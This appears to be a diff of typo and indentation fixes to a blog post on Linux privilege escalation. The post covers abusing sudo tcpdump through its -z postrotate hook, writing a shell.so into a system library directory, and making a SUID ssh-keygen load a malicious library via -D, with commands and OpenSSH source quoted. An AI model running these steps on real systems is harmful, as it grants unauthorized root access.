@@ -7,7 +7,7 @@ categories: [Deep-Dive]
   <p>Improvise, adapt and overcome!</p>
 </blockquote>
 
-A very well-known privileeg escalation trick involving `tcpdump` with sudo privileges (_very often found in large IT departments!_) involves executing a script instead of a postrotate command as so<sup>[1](https://gtfobins.github.io/gtfobins/tcpdump/)</sup>:
+A very well-known privileeg escalation trick involving `tcpdump` with sudo privileges (_very often found in large IT departments!_) relies on executing a script instead of a postrotate command as so<sup>[1](https://gtfobins.github.io/gtfobins/tcpdump/)</sup>:
 
 ```bash
 $ COMMAND='id'
@@ -17,7 +17,7 @@ $ chmod +x $TF
 $ tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF
 ```
 
-This is all nice and good but all defenders are already looking forthe `-z` command, and this trick is pretty easy to spot. But there's another privilege escalation technique, which also abuses the `sudo` privileges assigned to `tcpdump`, which works as follows:
+This is all nice and good but all defenders are already looking for the `-z` command, and this trick is pretty easy to spot. But there's another privilege escalation technique, which also abuses the `sudo` privileges assigned to `tcpdump`, which works as follows:
 * Abuse `tcpdump` privileges to create a writable file, in a privileged location:
 ```bash
 $ sudo tcpdump -i eth0 -w /lib/x86_64-linux-gnu/shell.so -Z $USER
@@ -58,7 +58,7 @@ Another interesting situation I recently run into is `ssh-keygen` binary with `s
 $ ls -al `which ssh-keygen`
 -rwsr-xr-x 1 root root 477488 Aug  4 22:02 /usr/bin/ssh-keygen
 ```
-There's an entry on GTFOBins for this<sup>[2](https://gtfobins.github.io/gtfobins/ssh-keygen/)</sup>, which hints at creating a shared library and load it via the `-D` parameter. This is the tricky part however. If we simply compile the library and try to force `ssh-keygen` to lod it, we get the following error:
+There's an entry on GTFOBins for this<sup>[2](https://gtfobins.github.io/gtfobins/ssh-keygen/)</sup>, which hints at creating a shared library and load it via the `-D` parameter. This is the tricky part however. If we simply compile the library and try to force `ssh-keygen` to load it, we get the following error:
 ```bash
 $ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 $ ssh-keygen -D shell.so
@@ -69,27 +69,27 @@ cannot read public key from pkcs11
 
 We can trace the error to the [ssh-pkcs11.c](https://github.com/openssh/libopenssh/blob/ea5ceecdc2037c5e6e807ab3702fbe3f319351d0/ssh/ssh-pkcs11.c#L486) source file:
 ```c
-	if (pkcs11_provider_lookup(provider_id) != NULL) {
-		error("provider already registered: %s", provider_id);
-		goto fail;
-	}
-	/* open shared pkcs11-libarary */
-	if ((handle = dlopen(provider_id, RTLD_NOW)) == NULL) {
-		error("dlopen %s failed: %s", provider_id, dlerror());
-		goto fail;
-	}
-	if ((getfunctionlist = dlsym(handle, "C_GetFunctionList")) == NULL) {
-		error("dlsym(C_GetFunctionList) failed: %s", dlerror());
-		goto fail;
-	}
-	p = xcalloc(1, sizeof(*p));
-	p->name = xstrdup(provider_id);
-	p->handle = handle;
-	/* setup the pkcs11 callbacks */
-	if ((rv = (*getfunctionlist)(&f)) != CKR_OK) {
-		error("C_GetFunctionList failed: %lu", rv);
-		goto fail;
-	}
+if (pkcs11_provider_lookup(provider_id) != NULL) {
+	error("provider already registered: %s", provider_id);
+	goto fail;
+}
+/* open shared pkcs11-libarary */
+if ((handle = dlopen(provider_id, RTLD_NOW)) == NULL) {
+	error("dlopen %s failed: %s", provider_id, dlerror());
+	goto fail;
+}
+if ((getfunctionlist = dlsym(handle, "C_GetFunctionList")) == NULL) {
+	error("dlsym(C_GetFunctionList) failed: %s", dlerror());
+	goto fail;
+}
+p = xcalloc(1, sizeof(*p));
+p->name = xstrdup(provider_id);
+p->handle = handle;
+/* setup the pkcs11 callbacks */
+if ((rv = (*getfunctionlist)(&f)) != CKR_OK) {
+	error("C_GetFunctionList failed: %lu", rv);
+	goto fail;
+}
 ```
 So our library needs to contain a function called `C_GetFunctionList` which accepts a pointer as its only argument and returns an `int`. We change the function definition as follows:
 ```c
